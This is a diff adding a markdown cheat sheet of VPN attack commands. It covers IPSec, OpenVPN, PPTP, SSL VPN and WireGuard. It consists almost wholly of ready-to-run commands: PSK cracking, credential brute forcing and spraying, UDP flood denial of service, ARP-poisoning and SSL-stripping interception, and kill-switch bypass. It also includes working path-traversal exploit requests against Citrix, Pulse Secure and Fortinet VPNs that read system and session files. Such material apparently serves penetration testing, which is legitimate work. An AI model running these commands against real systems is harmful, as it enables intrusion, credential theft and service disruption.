@@ -1,0 +1,279 @@
+# VPN Attack Payloads
+
+## VPN Fingerprinting and Detection
+
+### IKE Scanning (IPSec VPN)
+ike-scan 192.168.1.0/24                                                # Scan for IPSec VPNs
+ike-scan -M 192.168.1.100                                              # Aggressive mode scan
+ike-scan -A 192.168.1.100                                              # Main mode scan
+ike-scan -M -A --id=test 192.168.1.100                                 # With group name
+ike-scan --sport=500 --dport=500 192.168.1.100                         # Specific ports
+ike-scan -M --trans=5,2,1,2 192.168.1.100                              # Custom transform
+
+### Nmap VPN Detection
+nmap -sU -p 500,4500 --script=ike-version 192.168.1.100                # IKE version detection
+nmap -sU -p 500 --script=ipsec-ike-info 192.168.1.100                  # IPSec info
+nmap -p 1194 --script=openvpn-info 192.168.1.100                       # OpenVPN detection
+nmap -p 1723 --script=pptp-version 192.168.1.100                       # PPTP detection
+nmap -sU -p 1701 192.168.1.100                                         # L2TP detection
+
+### SSL VPN Detection
+nmap -p 443 --script=ssl-cert 192.168.1.100                            # SSL certificate
+nmap -p 443,4433,8443 --script=http-title 192.168.1.100                # Web-based VPN
+sslscan 192.168.1.100:443                                              # SSL/TLS analysis
+
+### VPN Service Banners
+nc -v 192.168.1.100 1723                                               # PPTP banner
+curl -I https://192.168.1.100                                          # HTTPS VPN portal
+
+## IPSec VPN Attacks
+
+### IKE Aggressive Mode PSK Cracking
+ike-scan -M -A --id=groupname 192.168.1.100 -P hash.txt                # Capture hash
+psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt                 # Crack PSK
+ikecrack -a hash.txt                                                   # Alternative cracker
+
+### IKE Main Mode Downgrade
+# Force aggressive mode
+ike-scan -M 192.168.1.100                                              # Try aggressive mode
+
+### IPSec IKEv1 Enumeration
+ike-scan -M --id=test -P- 192.168.1.100                                # Enumerate group names
+ike-scan -M --trans=5,2,1,2 --vendor=12906 192.168.1.100               # Vendor ID enumeration
+
+### Strongswan VPN Testing
+ipsec up connection                                                    # Connect to VPN
+ipsec down connection                                                  # Disconnect
+ipsec status                                                           # Status
+ipsec statusall                                                        # Detailed status
+
+### IPSec ESP Traffic Analysis
+tcpdump -i eth0 esp                                                    # Capture ESP traffic
+tcpdump -i eth0 'udp port 500 or udp port 4500'                        # IKE traffic
+tshark -i eth0 -f "udp port 500" -Y "isakmp"                           # ISAKMP analysis
+
+## OpenVPN Attacks
+
+### OpenVPN Service Detection
+nmap -p 1194 --script=openvpn-info 192.168.1.100                       # Service info
+nc -vu 192.168.1.100 1194                                              # UDP probe
+echo -e "\x38\x01\x00\x00\x00\x00\x00\x00\x00" | nc -u 192.168.1.100 1194
+
+### OpenVPN Configuration Extraction
+# If accessible via web portal
+curl http://192.168.1.100/client.ovpn                                  # Download config
+curl http://192.168.1.100/config/client.ovpn                           # Alternative path
+
+### OpenVPN Brute Force
+# Using hydra (if management interface exposed)
+hydra -L users.txt -P passwords.txt 192.168.1.100 openvpn              # Brute force
+
+### OpenVPN Denial of Service
+# UDP flood to OpenVPN port
+hping3 -2 --flood -p 1194 192.168.1.100                                # UDP flood
+nmap -sU -p 1194 --max-rate 10000 192.168.1.100                        # High rate scan
+
+## PPTP VPN Attacks
+
+### PPTP Enumeration
+nmap -p 1723 --script=pptp-version 192.168.1.100                       # Version detection
+nc -v 192.168.1.100 1723                                               # Banner grab
+
+### PPTP Brute Force
+thc-pptp-bruter -u users.txt -p passwords.txt 192.168.1.100            # THC PPTP brute
+ncrack -p 1723 --user admin -P passwords.txt 192.168.1.100             # Ncrack
+
+### PPTP Dictionary Attack
+# Using pptpcrack or similar tools
+# PPTP uses MS-CHAPv2 which can be attacked
+
+### PPTP MS-CHAPv2 Exploitation
+# Capture MSCHAPv2 handshake
+tcpdump -i eth0 -w pptp.pcap 'tcp port 1723'                           # Capture traffic
+# Extract and crack MS-CHAPv2 (known weaknesses)
+
+## L2TP/IPSec Attacks
+
+### L2TP Detection
+nmap -sU -p 1701 192.168.1.100                                         # L2TP detection
+nmap -sU -p 500,1701,4500 192.168.1.100                                # L2TP with IPSec
+
+### L2TP Brute Force
+# If exposed without IPSec
+xl2tpd                                                                 # L2TP daemon
+# Configure and attempt connections
+
+## SSL VPN Attacks
+
+### SSL VPN Portal Discovery
+nmap -p 443,4433,8443 --script=http-title 192.168.1.100                # Find portals
+gobuster dir -u https://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
+
+### SSL VPN Vulnerabilities
+# Citrix ADC (CVE-2019-19781)
+curl -k https://192.168.1.100/vpn/../vpns/cfg/smb.conf                 # Path traversal
+
+# Pulse Secure (CVE-2019-11510)
+curl -k https://192.168.1.100/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/
+
+# Fortinet SSL VPN (CVE-2018-13379)
+curl -k https://192.168.1.100/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+
+### SSL VPN Credential Stuffing
+hydra -L users.txt -P passwords.txt https-post-form://192.168.1.100/login:"username=^USER^&password=^PASS^:F=incorrect"
+
+### SSL VPN Session Hijacking
+# Capture session cookies
+tcpdump -i eth0 -A 'tcp port 443'                                      # Capture HTTPS
+# Use captured cookies in browser
+
+## WireGuard Attacks
+
+### WireGuard Detection
+nmap -sU -p 51820 192.168.1.100                                        # Default port scan
+nc -vu 192.168.1.100 51820                                             # UDP probe
+
+### WireGuard Configuration Exposure
+# Check for exposed configuration
+curl http://192.168.1.100/wg0.conf                                     # Config file
+find / -name "wg0.conf" 2>/dev/null                                    # Local search
+
+### WireGuard DoS
+# UDP flood
+hping3 -2 --flood -p 51820 192.168.1.100                               # UDP flood
+
+## VPN Traffic Analysis
+
+### Identify VPN Traffic
+tcpdump -i eth0 -n 'udp port 500 or udp port 4500 or udp port 1194 or tcp port 1723'
+tshark -i eth0 -Y "isakmp or openvpn or pptp"                          # VPN protocols
+wireshark                                                              # GUI analysis
+
+### VPN Fingerprinting with p0f
+p0f -i eth0                                                            # Passive fingerprinting
+# Identify VPN traffic patterns
+
+### Deep Packet Inspection
+# Use DPI tools to identify encrypted VPN traffic
+# ndpi, nDPI, or similar tools
+
+## VPN Bypass Techniques
+
+### Obfuscation
+# OpenVPN with obfsproxy
+openvpn --config client.ovpn --socks-proxy 127.0.0.1 1080              # SOCKS proxy
+
+# Stunnel wrapper
+stunnel /etc/stunnel/stunnel.conf                                      # SSL tunnel
+
+### Protocol Tunneling
+# SSH tunneling
+ssh -D 1080 user@192.168.1.100                                         # SOCKS proxy
+ssh -L 8080:target:80 user@192.168.1.100                               # Port forward
+
+# DNS tunneling to bypass VPN restrictions
+iodine -f 192.168.1.100 tunnel.domain.com                              # DNS tunnel
+
+### VPN over HTTP/HTTPS
+# Use VPN protocols that masquerade as HTTP/HTTPS
+# OpenVPN on port 443 TCP
+openvpn --remote 192.168.1.100 443 --proto tcp
+
+## VPN Exploitation Tools
+
+### IKEForce
+ike-scan -M 192.168.1.100                                              # Discover VPN
+# ikeforce.py for enumeration and brute forcing
+
+### Fiked
+fiked                                                                  # Fake IKE daemon
+# Use for MITM attacks on IKE
+
+### iker.py
+# Python IKE packet manipulation
+# Custom IKE packet crafting
+
+## VPN Credential Attacks
+
+### Dictionary Attack
+# VPN-specific wordlists
+hydra -L vpn_users.txt -P passwords.txt 192.168.1.100 vpn-protocol
+
+### Credential Harvesting
+# Phishing for VPN credentials
+# Fake VPN login portals
+# Social engineering
+
+### Password Spraying
+# Test common passwords across multiple VPN accounts
+# Avoid account lockouts
+
+## VPN MITM Attacks
+
+### ARP Poisoning + VPN Interception
+ettercap -T -i eth0 -M arp /// ///                                     # ARP MITM
+# Capture VPN traffic
+
+### SSL Stripping on VPN Portals
+sslstrip -l 8080                                                       # Strip SSL
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+### Rogue VPN Server
+# Setup fake VPN server
+# Use stolen/weak credentials
+# Capture plaintext traffic
+
+## VPN Reconnaissance
+
+### Shodan VPN Search
+# Search for exposed VPN services
+# shodan search "vpn"
+# shodan search "port:500"
+# shodan search "IKE"
+
+### Certificate Analysis
+openssl s_client -connect 192.168.1.100:443 -showcerts                 # Get certificates
+# Analyze for information disclosure
+
+### OSINT VPN Discovery
+# Google dorking
+# site:target.com "vpn"
+# site:target.com "remote access"
+# inurl:vpn site:target.com
+
+## Split Tunneling Exploitation
+
+### Identify Split Tunneling
+ip route                                                               # Check routing table
+route -n                                                               # Display routes
+netstat -rn                                                            # Routing information
+
+### Exploit Split Tunnel
+# If VPN uses split tunneling, attack local network
+# While appearing to be on VPN
+nmap 192.168.1.0/24                                                    # Scan local network
+
+## VPN Kill Switch Bypass
+
+### Route Manipulation
+ip route add default via 192.168.1.1                                   # Add default route
+# Bypass VPN kill switch
+
+### Network Namespace Escape
+ip netns list                                                          # List namespaces
+ip netns exec vpnns bash                                               # Execute in namespace
+
+## Mobile VPN Attacks
+
+### AnyConnect Exploitation
+# Cisco AnyConnect vulnerabilities
+# Check for known CVEs
+
+### GlobalProtect Attacks
+# Palo Alto GlobalProtect
+# Portal enumeration and exploitation
+
+### VPN Profile Extraction
+# Extract VPN profiles from mobile devices
+# Android: /data/misc/vpn/
+# iOS: iTunes backup analysis
